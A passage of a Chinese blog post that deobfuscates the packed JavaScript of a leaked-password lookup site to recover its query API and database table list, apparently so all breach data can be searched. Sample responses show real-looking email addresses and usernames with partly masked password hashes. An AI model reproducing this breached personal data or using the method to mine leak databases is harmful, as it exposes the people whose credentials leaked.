<p>参数都特别简单，<code>select_act</code>表示<code>User and Email/User/Emial</code>，<code>match_act</code>表示模糊/精确查询，key就是输入的关键字。最后一个table比较重要了，表示在什么库中查询，扫描时看到进度变化，在什么库中进行了多少了，每次搜索都会在这所有库中搜索，直到结束。</p>
<p>这个数据应该存在了本地，或者初始化时服务器返回了。暂时不管，后面继续重点分析（有意思的就在这）。</p>
<p>请求返回数据，有下面几种情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">没有返回空内容</span><br><span class="line"></span><br><span class="line">//该库只有一条数据</span><br><span class="line">addRow(&quot;ll111&quot;,&quot;348720221@qq.com&quot;,&quot;202**962AC59075B964B07152D234B70&quot;,&quot;212300_cxhr_zhaopin_com&quot;);</span><br><span class="line"></span><br><span class="line">//该库有多少数据</span><br><span class="line">addRow(&quot;&apos;fish13&apos;, &apos;fish1346@qq.com&apos;, &apos;**&apos;, &apos;mail_qq_sohu&quot;);addRow(&quot;fish13&apos;, &apos;592545012@qq.com&apos;, &apos;**&apos;, &apos;mail_qq_sohu&quot;);addRow(&quot;fish13&apos;, &apos;m_srikanth@sohu.com&apos;, &apos;**&apos;, &apos;mail_qq_sohu&apos;], [&apos;fish13&apos;, &apos;&apos;, &apos;176**1176671&apos;, &apos;qq_old_password&apos;</span><br></pre></td></tr></table></figure></p>
<h1 id="0x02-分析table"><a href="#0x02-分析table" class="headerlink" title="0x02 分析table"></a>0x02 分析table</h1><p>其实接口很清楚了，但是还需要直到所有table的内容，然后才能完成所有数据搜索。</p>
<p>所以，table怎么找，在哪里呢！</p>
<p>还是要分析代码了…</p>
<p>看看表单所在位置代码，找找搜索按钮的响应函数（这里也可以看到上面说的参数的详情），很明显响应函数是getdata。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;span class=&quot;input-group&quot;&gt;</span><br><span class="line">  &lt;select class=&quot;btn btn-success&quot; id=&quot;match_act&quot; name=&quot;match_act&quot;&gt;</span><br><span class="line">    &lt;option value=&quot;2&quot; selected=&quot;&quot;&gt;精确匹配&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;1&quot;&gt;模糊查询&lt;/option&gt;</span><br><span class="line">  &lt;/select&gt;</span><br><span class="line"> </span><br><span class="line">  &lt;select class=&quot;btn btn-primary&quot; id=&quot;select_act&quot; name=&quot;select_act&quot;&gt;</span><br><span class="line">    &lt;option class=&quot;btn-group&quot; value=&quot;3&quot; selected=&quot;&quot;&gt;User and Email&lt;/option&gt;</span><br><span class="line">    &lt;option  class=&quot;btn-group&quot; value=&quot;1&quot;&gt;Username&lt;/option&gt;</span><br><span class="line">    &lt;option class=&quot;btn-group&quot; value=&quot;2&quot;&gt;Email&lt;/option&gt;</span><br><span class="line">  &lt;/select&gt;</span><br><span class="line">  &lt;/span&gt;&lt;/p&gt;</span><br><span class="line">  &lt;div id=&quot;jshint-pitch&quot; class=&quot;alert alert-info scan-wait&quot; style=&quot;display:none;margin-top:10px;font-size:14px&quot;&gt;  &lt;/div&gt;</span><br><span class="line">  &lt;div id=&quot;scan-result-box&quot; style=&quot;font-size:12px;&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;input-group&quot;&gt;&lt;span class=&quot;input-group-btn scan-but-span&quot;&gt;</span><br><span class="line">      &lt;button type=&quot;button&quot; class=&quot;btn btn-success&quot; onClick=&quot;getdata();&quot;&gt;试试吧!&lt;/button&gt;</span><br><span class="line">      &lt;/span&gt;</span><br><span class="line">      &lt;input placeholder=&quot;华西安全网提示：输入用户名、QQ、Email..看看你的密码是否泄露~~~请勿非法用途~~&quot;  name=&quot;key&quot; class=&quot;form-control&quot; id=&quot;key&quot; &gt;&lt;/input&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">	&lt;br&gt;</span><br></pre></td></tr></table></figure>
<p>在html，js中一番搜索，tmd居然没有。<br>只在system.js中看到了这个！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">傻逼|你TM的来打我啊|getdata|stend|u5927|</span><br></pre></td></tr></table></figure>
<p><img src="/img/hxsec2.png" alt="img"></p>
<p>—-手工分割线——-</p>
<p>TMD的，我这暴脾气，这是挑衅啊，lz非搞你不可了！这已经上升到人身攻击了！！！</p>
<p>—-手工分割线——-</p>
<p>很明显，tmd代码混淆了。怎么办，调试跟呗。</p>
<p>把system.js（用chrome格式化一下，不然…瞎眼）扒出来一看，其实也不复杂。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//jb 5/24修改</span><br><span class="line">eval(function(p, a, c, k, e, d) &#123;</span><br><span class="line">    e = function(c) &#123;</span><br><span class="line">        return (c &lt; a ? &quot;&quot; : e(parseInt(c / a))) + ((c = c % a) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36))</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line">    if (!&apos;&apos;.replace(/^/, String)) &#123;</span><br><span class="line">        while (c--)</span><br><span class="line">            d[e(c)] = k[c] || e(c);</span><br><span class="line">        k = [function(e) &#123;</span><br><span class="line">            return d[e]</span><br><span class="line">        &#125;</span><br><span class="line">        ];</span><br><span class="line">        e = function() &#123;</span><br><span class="line">            return &apos;\\w+&apos;</span><br><span class="line">        &#125;</span><br><span class="line">        ;</span><br><span class="line">        c = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    ;while (c--)</span><br><span class="line">        if (k[c])</span><br><span class="line">            p = p.replace(new RegExp(&apos;\\b&apos; + e(c) + &apos;\\b&apos;,&apos;g&apos;), k[c]);</span><br><span class="line">    return p;</span><br><span class="line">&#125;(&apos;3o 2Y$=[&quot;&quot;,\&apos;\&apos;,\&apos;\\\\w+\&apos;,\&apos;\\\\b\&apos;,\&apos;\\\\b\&apos;,\&apos;g\&apos;,\&apos;d c$=[&quot;1W&quot;,&quot;#n&quot;,&quot;1T&quot;,&quot;1R&quot;,&quot;#n&quot;,&quot;\\\\2h\\\\2g\\\\k\\\\p&quot;,&quot; \\\\2i\\\\2k\\\\1N&quot;,&quot;%&quot;,&quot;H&quot;,&quot;H&quot;,&quot;#n&quot;,&quot;\\\\k\\\\p\\\\T\\\\O!\\\\1q\\\\1t\\\\1j\\\\1k\\\\1g\\\\G\\\\D\\\\E\\\\U\\\\W \\\\z\\\\A:	&quot;,&quot;\\\\C\\\\B&quot;,&quot;#n&quot;,&quot;\\\\k\\\\p\\\\T\\\\O! \\\\U\\\\W\\\\1v:&quot;,&quot;\\\\1u \\\\z\\\\A:&quot;,&quot;\\\\C\\\\B&quot;,&quot;#n&quot;,&quot;\\\\k\\\\p\\\\T\\\\O! \\\\U\\\\W\\\\1v:&quot;,&quot;\\\\1u \\\\z\\\\A:&quot;,&quot;\\\\C\\\\B&quot;,\\\&apos;2j\\\&apos;,&quot;1D&quot;,&quot;1p=&quot;,&quot;&amp;1o=&quot;,&quot;&amp;I=&quot;,&quot;&amp;2c=&quot;,\\\&apos;1O.2b?2d=2f\\\&apos;,&quot;#H&quot;,&quot;1T&quot;,&quot;1R&quot;,&quot;#I&quot;,\\\&apos;\\\&apos;,&quot;#I&quot;,&quot;\\\\Z\\\\2e\\\\2l\\\\k\\\\p\\\\1r\\\\1n/\\\\G\\\\D\\\\E/\\\\2s\\\\2r&quot;,&quot;\\\\G\\\\D\\\\E\\\\2t\\\\1N\\\\Z\\\\2v\\\\2u!!&quot;,&quot;#1p&quot;,&quot;#1o&quot;,&quot;1C&quot;,&quot;\\\\1q\\\\1t\\\\2n\\\\1g\\\\2m\\\\1j\\\\1k\\\\2o\\\\1r\\\\1n\\\\2q&quot;,&quot;2p|2a~!1X~!1Z|a|1Y|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b&quot;];d o;d N;e 1D(1y,1U,1J,Y)&#123;d l=1C[&quot;2V&quot;]();d 1A=l[&quot;q&quot;](0);d 1I=l[&quot;q&quot;](1);d 1V=l[&quot;q&quot;](2);d 1M=l[&quot;q&quot;](3);1A[&quot;w&quot;]=1y;1I[&quot;w&quot;]=1U;1V[&quot;w&quot;]=1J;1M[&quot;w&quot;]=Y&#125;;e 1x()&#123;$( c$[0])[&quot;2U&quot;]()&#125;;e 1Q(1l,1e,1b)&#123;$( c$[1])[&quot;1z&quot;]( c$[2], c$[3]);d 1c=(1l/1e)*g;d M=X(1c,1);t[&quot;r&quot;]( c$[4],M,g, c$[5]+1b+ c$[6]+M+ c$[7])&#125;;e 1L()&#123;v=1F 1G()[&quot;1H&quot;]()-N;d 1s=R[&quot;Q&quot;]( c$[8]);d y=1s[&quot;P&quot;][&quot;f&quot;];i(y==1)&#123;d 1i=R[&quot;Q&quot;]( c$[9]);d 1m=1i[&quot;P&quot;][&quot;f&quot;];i(1m==1)&#123;t[&quot;r&quot;]( c$[10],g,g, c$[11]+(v)+ c$[12])&#125;1h&#123;t[&quot;r&quot;]( c$[13],g,g, c$[14]+(y-1)+ c$[15]+(v)+ c$[16])&#125;&#125;1h&#123;t[&quot;r&quot;]( c$[17],g,g, c$[18]+(y-1)+ c$[19]+(v)+ c$[20])&#125;&#125;;e X(1a,1d)&#123;d F=1f[&quot;2T&quot;](10,1d);S 1f[&quot;2X&quot;](1a*F)/F&#125;;e 1S(1P,s,1K,2W)&#123;$[&quot;1O&quot;](&#123;2D: c$[21],2C:1P,2E:s,2G:e(J)&#123;i(J[&quot;2F&quot;]( c$[22])&gt;=0)&#123;2B(J)&#125;;i(1K==V[&quot;f&quot;])&#123;1L()&#125;&#125;&#125;)&#125;;e 1E(j,u,x,m,h)&#123;1Q(h+1,m[&quot;f&quot;],m[h]);d s= c$[23]+u+ c$[24]+x+ c$[25]+j+ c$[26]+m[h];1S( c$[27],s,o+1,m[&quot;f&quot;]);o=o+1&#125;;e 2x()&#123;$( c$[28])[&quot;1z&quot;]( c$[29], c$[2w]);1x();d j=$( c$[2y])[&quot;K&quot;]();i(j== c$[2A])&#123;$( c$[2z])[&quot;2H&quot;]();L( c$[2P]);S 1w&#125;;i(j[&quot;f&quot;]&lt;4)&#123;L( c$[2O]);S 1w&#125;;d u=$( c$[2Q])[&quot;K&quot;]();d x=$( c$[2S])[&quot;K&quot;]();N=1F 1G()[&quot;1H&quot;]();o=0;2R(d h=0;h&lt;V[&quot;f&quot;];h++)&#123;1E(j,u,x,V,h)&#125;&#125;;e 2N()&#123;d 1B=R[&quot;Q&quot;]( c$[2J])[&quot;P&quot;][&quot;f&quot;];i(1B==0)&#123;L( c$[2I])&#125;&#125;;e 2K()&#123;d 2M= c$[2L]&#125;\&apos;,\&apos;||||||||||4U|4R|2Y|3o|3e|4Q|4T|4S|3h|54|53|56|50|52|4z|4B|4M|4O|4J|5w|5v|5q|5s|4b|4c|49|4a|4f|4g|4d|4e|48|42|43|3Z|41|46|47|3f|44|45|4h|4t|4u|3b|4r|4s|4x|4y|4v|4w|4q|||||||||||4k|4l|2Z|4i|4j|4o|4p|4m|4n|3Y|3p|3d|3u|3v|3w|3y|3A|3z|3x|3E|3F|3D|3B|3C|3s|3t|3r|3q|3R|3S|3P|3j|3Q|3T|3W|3X|3U|3V|3I|3J|3G|3H|3K|3N|3O|3L|3M|5j|5k|5h|5i|5n|||||||||||5o|5l|5m|5g|5a|5b|58|59|5e|5f|5c|5d|5A|5B|5y|5z|5E|5F|5C|5D|5x|5r|30|5p|31|33|32|3n|5t|5u|57|4K|4L|4I|39|38|4P|40|4N|4H|35|34|36|4C|37|4A|4F|4G|4D|4E\&apos;,\&apos;|\&apos;];3n(3e(3g,3d,2Z,3c,e,3f)&#123;e=3e(3a)&#123;3b(3a&lt;3d? 2Y$[0]:e(51(3a/3d)))+((3a=3a%3d)&gt;35?3i[&quot;4Z&quot;](3a+29):3a[&quot;55&quot;](36))&#125;;3h(! 2Y$[1][&quot;3k&quot;](/^/,3i))&#123;3m(2Z--)3f[e(2Z)]=3c[2Z]||e(2Z);3c=[3e(3l)&#123;3b 3f[3l]&#125;];e=3e()&#123;3b 2Y$[2]&#125;;2Z=1&#125;;3m(2Z--)3h(3c[2Z])3g=3g[&quot;3k&quot;](3j 4Y( 2Y$[3]+e(2Z)+ 2Y$[4], 2Y$[5]),3c[2Z]);3b 3g&#125;( 2Y$[6],4W,4X, 2Y$[7][&quot;4V&quot;]( 2Y$[8]),0,&#123;&#125;))&apos;, 62, 352, &apos;||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||_|somd5comf78518fb1|||||||||||somd5com21a288587|return|somd5com6d38bb14b|somd5com3de2f8f6d|function|somd5comd152c7b41|somd5comf3298c8c5|if|String|new|replace|somd5com8f18e7d16|while|eval|var|u7d22|somd5com16af76eea|somd5com6cd7bc889|somd5comed2bd7eb6|css|somd5comb9e3341a3|u5bb9|match_act|somd5com4d38b6944|select_act|u5185|u6ca1|false|get_del|u91cf|u6709|u6761|ajax|somd5come0b7918e1|somd5com4823e252c|u5ea6|get_jdt|display|somd5com811fa93b4|block|ajax_post|get_data|Date|value_tables|addRow|getTime|somd5com25f9df3a7|get_okcount|somd5com6d6674984|somd5comf49be7e59|u641c|key||somd5com9a3a7ef82|u5173|somd5_table|somd5com326e7999e|u6bd5|val|alert|somd5com956a89722|u8017|u65f6|somd5comd7f929c0a|somd5comf1d14de2e|u952e|u5b57|u79d2|u6beb|rows|somd5comf46beb405|somd5com738c8372f|somd5com3b1df0e8d|somd5comdcaedb43e|else|somd5com36f2c91c7|Math|u5230|u8bf7|u5b8c|u6570|getElementById|document|decimal|somd5com5b49d9f12|database|u636e|somd5comdd52905dc|pow|u8be2|for|somd5comb39f98f6a|round|empty|insertRow|gat_kong|focus|somd5comf53e662dd|indexOf|success|insertCell|somd5comea98952b0|progress|dataxxxx|length|SOMD5|somd5comb93c3a502|100|搜MD5|split|62|184|RegExp|fromCharCode|somd5com4af3e5365|parseInt|selecting|u67e5|somd5com490d63bb2|toString|somd5comf94f3be31|data|u5728|u6b63|u8f93|select|u8fdb|u5165|u603b|POST|act|来打我啊|SOMD55|somd5comeff53bcd1|tbody|php|table|傻逼|你TM的来打我啊|getdata|stend|u5927|innerHTML|url|type|somd5combdba21b9c|Administry|u4e8e4|u7684|操你妈|u60a8|u627e|u90ae|u957f|u5462|u7bb1&apos;.split(&apos;|&apos;), 0, &#123;&#125;));</span><br></pre></td></tr></table></figure>
<p>不过直接看也挺闹人的，边调试边看吧。</p>
<p>参数是什么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// p是字符串</span><br><span class="line">// a 是62</span><br><span class="line">// c 是 352数组大小， k 是Array[352]</span><br><span class="line">// e 是0 ， d 是&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>e函数干嘛了？具体返回数据暂时也不同看了，调试到了自然可以dump出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e = function(c) &#123;</span><br><span class="line">		//61以内的就返回字符，0-9,a-z(11-36),A-Z(36-61)</span><br><span class="line">		//62以上</span><br><span class="line">		//c.toString(36) 36进制转为字符</span><br><span class="line">        return (c &lt; a ? &quot;&quot; : e(parseInt(c / a))) + ((c = c % a) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36))</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>然后就解密那一长串字符了，用的e<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while (c--)</span><br><span class="line">            d[e(c)] = k[c] || e(c);</span><br></pre></td></tr></table></figure></p>
<p>解出来的数据大概是这样的一个object，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">5y: &apos;u7684&apos;</span><br><span class="line">5x: &apos;u4e8e4&apos;</span><br><span class="line">5w: &apos;Administry&apos;</span><br><span class="line">5v: &apos;somd5combdba21b9c&apos;</span><br><span class="line">5u: &apos;type&apos;</span><br><span class="line">5t: &apos;url&apos;</span><br><span class="line">5s: &apos;innerHTML&apos;</span><br><span class="line">5r: &apos;u5927&apos;</span><br><span class="line">5q: &apos;stend&apos;</span><br><span class="line">5p: &apos;getdata&apos;</span><br><span class="line">5o: &apos;你TM的来打我啊&apos;</span><br><span class="line">5n: &apos;傻逼&apos;</span><br><span class="line">5m: &apos;table&apos;</span><br><span class="line">5l: &apos;php&apos;</span><br><span class="line">5k: &apos;tbody&apos;</span><br><span class="line">5j: &apos;somd5comeff53bcd1&apos;</span><br></pre></td></tr></table></figure>
<p>然后继续解，将结果返回给eval执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while (c--)</span><br><span class="line">        if (k[c])</span><br><span class="line">            p = p.replace(new RegExp(&apos;\\b&apos; + e(c) + &apos;\\b&apos;,&apos;g&apos;), k[c]);</span><br></pre></td></tr></table></figure>
<p>直接dump结果，如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var _$ = [&quot;&quot;, &apos;&apos;, &apos;\\w+&apos;, &apos;\\b&apos;, &apos;\\b&apos;, &apos;g&apos;, &apos;d c$=[&quot;1W&quot;,&quot;#n&quot;,&quot;1T&quot;,&quot;1R&quot;,&quot;#n&quot;,&quot;\\2h\\2g\\k\\p&quot;,&quot; \\2i\\2k\\1N&quot;,&quot;%&quot;,&quot;H&quot;,&quot;H&quot;,&quot;#n&quot;,&quot;\\k\\p\\T\\O!\\1q\\1t\\1j\\1k\\1g\\G\\D\\E\\U\\W \\z\\A:	&quot;,&quot;\\C\\B&quot;,&quot;#n&quot;,&quot;\\k\\p\\T\\O! \\U\\W\\1v:&quot;,&quot;\\1u \\z\\A:&quot;,&quot;\\C\\B&quot;,&quot;#n&quot;,&quot;\\k\\p\\T\\O! \\U\\W\\1v:&quot;,&quot;\\1u \\z\\A:&quot;,&quot;\\C\\B&quot;,\&apos;2j\&apos;,&quot;1D&quot;,&quot;1p=&quot;,&quot;&amp;1o=&quot;,&quot;&amp;I=&quot;,&quot;&amp;2c=&quot;,\&apos;1O.2b?2d=2f\&apos;,&quot;#H&quot;,&quot;1T&quot;,&quot;1R&quot;,&quot;#I&quot;,\&apos;\&apos;,&quot;#I&quot;,&quot;\\Z\\2e\\2l\\k\\p\\1r\\1n/\\G\\D\\E/\\2s\\2r&quot;,&quot;\\G\\D\\E\\2t\\1N\\Z\\2v\\2u!!&quot;,&quot;#1p&quot;,&quot;#1o&quot;,&quot;1C&quot;,&quot;\\1q\\1t\\2n\\1g\\2m\\1j\\1k\\2o\\1r\\1n\\2q&quot;,&quot;2p|2a~!1X~!1Z|a|1Y|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b|a|b&quot;];d o;d N;e 1D(1y,1U,1J,Y)&#123;d l=1C[&quot;2V&quot;]();d 1A=l[&quot;q&quot;](0);d 1I=l[&quot;q&quot;](1);d 1V=l[&quot;q&quot;](2);d 1M=l[&quot;q&quot;](3);1A[&quot;w&quot;]=1y;1I[&quot;w&quot;]=1U;1V[&quot;w&quot;]=1J;1M[&quot;w&quot;]=Y&#125;;e 1x()&#123;$( c$[0])[&quot;2U&quot;]()&#125;;e 1Q(1l,1e,1b)&#123;$( c$[1])[&quot;1z&quot;]( c$[2], c$[3]);d 1c=(1l/1e)*g;d M=X(1c,1);t[&quot;r&quot;]( c$[4],M,g, c$[5]+1b+ c$[6]+M+ c$[7])&#125;;e 1L()&#123;v=1F 1G()[&quot;1H&quot;]()-N;d 1s=R[&quot;Q&quot;]( c$[8]);d y=1s[&quot;P&quot;][&quot;f&quot;];i(y==1)&#123;d 1i=R[&quot;Q&quot;]( c$[9]);d 1m=1i[&quot;P&quot;][&quot;f&quot;];i(1m==1)&#123;t[&quot;r&quot;]( c$[10],g,g, c$[11]+(v)+ c$[12])&#125;1h&#123;t[&quot;r&quot;]( c$[13],g,g, c$[14]+(y-1)+ c$[15]+(v)+ c$[16])&#125;&#125;1h&#123;t[&quot;r&quot;]( c$[17],g,g, c$[18]+(y-1)+ c$[19]+(v)+ c$[20])&#125;&#125;;e X(1a,1d)&#123;d F=1f[&quot;2T&quot;](10,1d);S 1f[&quot;2X&quot;](1a*F)/F&#125;;e 1S(1P,s,1K,2W)&#123;$[&quot;1O&quot;](&#123;2D: c$[21],2C:1P,2E:s,2G:e(J)&#123;i(J[&quot;2F&quot;]( c$[22])&gt;=0)&#123;2B(J)&#125;;i(1K==V[&quot;f&quot;])&#123;1L()&#125;&#125;&#125;)&#125;;e 1E(j,u,x,m,h)&#123;1Q(h+1,m[&quot;f&quot;],m[h]);d s= c$[23]+u+ c$[24]+x+ c$[25]+j+ c$[26]+m[h];1S( c$[27],s,o+1,m[&quot;f&quot;]);o=o+1&#125;;e 2x()&#123;$( c$[28])[&quot;1z&quot;]( c$[29], c$[2w]);1x();d j=$( c$[2y])[&quot;K&quot;]();i(j== c$[2A])&#123;$( c$[2z])[&quot;2H&quot;]();L( c$[2P]);S 1w&#125;;i(j[&quot;f&quot;]&lt;4)&#123;L( c$[2O]);S 1w&#125;;d u=$( c$[2Q])[&quot;K&quot;]();d x=$( c$[2S])[&quot;K&quot;]();N=1F 1G()[&quot;1H&quot;]();o=0;2R(d h=0;h&lt;V[&quot;f&quot;];h++)&#123;1E(j,u,x,V,h)&#125;&#125;;e 2N()&#123;d 1B=R[&quot;Q&quot;]( c$[2J])[&quot;P&quot;][&quot;f&quot;];i(1B==0)&#123;L( c$[2I])&#125;&#125;;e 2K()&#123;d 2M= c$[2L]&#125;&apos;, &apos;||||||||||搜MD5|SOMD5|_|var|function|length|100|somd5comb93c3a502|if|somd5com490d63bb2|u67e5|somd5comf94f3be31|somd5com4af3e5365|selecting|somd5comdd52905dc|u8be2|insertCell|progress|somd5comf53e662dd|Administry|somd5combdba21b9c|stend|innerHTML|somd5comd7f929c0a|somd5comf1d14de2e|u8017|u65f6|u79d2|u6beb|u952e|u5b57|somd5com956a89722|u5173|somd5_table|key|somd5com9a3a7ef82|val|alert|somd5comd152c7b41|somd5com326e7999e|u6bd5|rows|getElementById|document|return|u5b8c|u6570|database|u636e|decimal|somd5com5b49d9f12|u8bf7|||||||||||somd5com3b1df0e8d|somd5comdcaedb43e|somd5comf78518fb1|somd5comf46beb405|somd5com738c8372f|Math|u5230|else|somd5com36f2c91c7|u641c|u7d22|somd5com3de2f8f6d|somd5comb9e3341a3|u5bb9|match_act|select_act|u6ca1|u5185|somd5com4d38b6944|u6709|u6761|u91cf|false|get_del|somd5comed2bd7eb6|css|somd5com6cd7bc889|somd5com16af76eea|value_tables|addRow|get_data|new|Date|getTime|somd5com6d6674984|somd5comf49be7e59|somd5com25f9df3a7|get_okcount|somd5com4823e252c|u5ea6|ajax|somd5come0b7918e1|get_jdt|block|ajax_post|display|somd5com811fa93b4|somd5comeff53bcd1|tbody|来打我啊|SOMD55|傻逼|||||||||||你TM的来打我啊|php|table|act|u8f93|select|u5728|u6b63|u603b|POST|u8fdb|u5165|u60a8|u627e|u7684|操你妈|u5462|u7bb1|u90ae|u957f|u4e8e4|u5927|30|getdata|31|33|32|eval|url|type|data|indexOf|success|focus|39|38|dataxxxx|40|somd5comea98952b0|gat_kong|35|34|36|for|37|pow|empty|insertRow|somd5comb39f98f6a|round&apos;, &apos;|&apos;];</span><br><span class="line">eval(function(somd5comf3298c8c5, somd5com3de2f8f6d, somd5comf78518fb1, somd5com6d38bb14b, e, somd5comd152c7b41) &#123;</span><br><span class="line">	//</span><br><span class="line">    e = function(somd5com21a288587) &#123;</span><br><span class="line">        return (somd5com21a288587 &lt; somd5com3de2f8f6d ? _$[0] : e(parseInt(somd5com21a288587 / somd5com3de2f8f6d))) + ((somd5com21a288587 = somd5com21a288587 % somd5com3de2f8f6d) &gt; 35 ? String[&quot;fromCharCode&quot;](somd5com21a288587 + 29) : somd5com21a288587[&quot;toString&quot;](36))</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line">    if (!_$[1][&quot;replace&quot;](/^/, String)) &#123;</span><br><span class="line">        while (somd5comf78518fb1--)</span><br><span class="line">            somd5comd152c7b41[e(somd5comf78518fb1)] = somd5com6d38bb14b[somd5comf78518fb1] || e(somd5comf78518fb1);</span><br><span class="line">        somd5com6d38bb14b = [function(somd5com8f18e7d16) &#123;</span><br><span class="line">            return somd5comd152c7b41[somd5com8f18e7d16]</span><br><span class="line">        &#125;</span><br><span class="line">        ];</span><br><span class="line">        e = function() &#123;</span><br><span class="line">            return _$[2]</span><br><span class="line">        &#125;</span><br><span class="line">        ;</span><br><span class="line">        somd5comf78518fb1 = 1</span><br><span class="line">    &#125;</span><br><span class="line">    ;while (somd5comf78518fb1--)</span><br><span class="line">        if (somd5com6d38bb14b[somd5comf78518fb1])</span><br><span class="line">            somd5comf3298c8c5 = somd5comf3298c8c5[&quot;replace&quot;](new RegExp(_$[3] + e(somd5comf78518fb1) + _$[4],_$[5]), somd5com6d38bb14b[somd5comf78518fb1]);</span><br><span class="line">    return somd5comf3298c8c5</span><br><span class="line">&#125;(_$[6], 62, 184, _$[7][&quot;split&quot;](_$[8]), 0, &#123;&#125;))</span><br></pre></td></tr></table></figure>
<p>有没有感觉很熟悉的结果，就是上面解密的哪个函数，参数变量真tmd<br>好看。不详细说了，跟前一次一样，最后返回一个解密的js代码，给eval执行。</p>
<p>这次dump出来看到了要的东西了！注释都有了，就不说了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function getdata() &#123;</span><br><span class="line">    $(_$[28])[&quot;css&quot;](_$[29], _$[30]);</span><br><span class="line">    get_del();</span><br><span class="line">    var somd5com490d63bb2 = $(_$[31])[&quot;val&quot;]();//输入</span><br><span class="line">    if (somd5com490d63bb2 